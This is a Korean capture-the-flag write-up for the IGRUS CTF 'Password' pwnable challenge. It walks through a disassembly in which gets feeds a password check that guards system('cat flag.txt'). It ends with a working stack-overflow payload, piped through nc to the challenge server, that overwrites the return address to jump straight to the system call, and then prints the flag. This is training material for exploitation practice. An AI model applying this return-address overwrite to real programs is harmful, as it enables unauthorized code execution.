# Password
- - - -

*  main
```
 0x4007a6 <main>       push   rbp
   0x4007a7 <main+1>     mov    rbp, rsp
   0x4007aa <main+4>     sub    rsp, 0x50
   0x4007ae <main+8>     mov    rax, qword ptr [rip + 0x2008c3] <0x601078>
   0x4007b5 <main+15>    mov    esi, 0
   0x4007ba <main+20>    mov    rdi, rax
   0x4007bd <main+23>    call   setbuf@plt <0x400640>
 
   0x4007c2 <main+28>    mov    esi, 0x4008f8
   0x4007c7 <main+33>    mov    edi, 0x4008fb
   0x4007cc <main+38>    call   fopen@plt <0x400690>
 
   0x4007d1 <main+43>    mov    qword ptr [rbp - 8], rax

   0x4007d5 <main+47>    mov    rdx, qword ptr [rbp - 8]
   0x4007d9 <main+51>    lea    rax, [rbp - 0x30]
   0x4007dd <main+55>    mov    rcx, rdx
   0x4007e0 <main+58>    mov    edx, 0x10
   0x4007e5 <main+63>    mov    esi, 1
   0x4007ea <main+68>    mov    rdi, rax
   0x4007ed <main+71>    call   fread@plt <0x400620>
 
   0x4007f2 <main+76>    mov    byte ptr [rbp - 0x20], 0
   0x4007f6 <main+80>    mov    edi, 0x400908
   0x4007fb <main+85>    mov    eax, 0
   0x400800 <main+90>    call   printf@plt <0x400660>

   0x400805 <main+95>    lea    rax, [rbp - 0x50]
   0x400809 <main+99>    mov    rdi, rax
   0x40080c <main+102>    mov    eax, 0
   0x400811 <main+107>    call   gets@plt <0x400680>
 
   0x400816 <main+112>    lea    rax, [rbp - 0x30]
   0x40081a <main+116>    mov    rdi, rax
   0x40081d <main+119>    call   strlen@plt <0x400630>
 
   0x400822 <main+124>    mov    rdx, rax
   0x400825 <main+127>    lea    rcx, [rbp - 0x50]
   0x400829 <main+131>    lea    rax, [rbp - 0x30]
   0x40082d <main+135>    mov    rsi, rcx

   0x400830 <main+138>    mov    rdi, rax
   0x400833 <main+141>    call   strncmp@plt <0x400600>
 
   0x400838 <main+146>    test   eax, eax
   0x40083a <main+148>    jne    main+177 <0x400857>
 
   0x40083c <main+150>    mov    edi, 0x400943
   0x400841 <main+155>    call   puts@plt <0x400610>
 
   0x400846 <main+160>    mov    edi, 0x400954
   0x40084b <main+165>    mov    eax, 0
   0x400850 <main+170>    call   system@plt <0x400650>
 
   0x400855 <main+175>    jmp    main+187 <0x400861>
 
   0x400857 <main+177>    mov    edi, 0x400961

   0x40085c <main+182>    call   puts@plt <0x400610>
 
   0x400861 <main+187>    mov    eax, 0
   0x400866 <main+192>    leave  
   0x400867 <main+193>    ret  
```

* fopen
```
pwndbg> x/s 0x4008fb
0x4008fb:	"password.txt"
```

* system
```
pwndbg> x/s 0x400954
0x400954:	"cat flag.txt"
```

password.txt 를 읽어서 그안에있는 pw와 입력한 pw를 비교후 일치하면 cat flag.txt 를 실행하는 코드이다.
get함수를 이용하기에 ret을 이용해서 시스템 함수를 호출하는 부분으로 이동시키면 될것 같다.

* ret으로 이동해서 실행할 코드
```
0x400846 <main+160>    mov    edi, 0x400954
0x40084b <main+165>    mov    eax, 0
0x400850 <main+170>    call   system@plt <0x400650>
```

64bit 프로그램이니 payload 구성은 null(80byte) + rbp(8byte) + ret(8byte) 이다.


## Exploit
- - - -
(python -c "print 'A'*80 + 'B'*8 + '\x46\x08\x40\x00\x00\x00\x00\x00'") | nc igrus.cf 8104


## flag
- - - -
flag{34sy_p4ssw0rd_p4ss1ng}



#IGRUS_CTF #IGRUS_CTF/Pwnable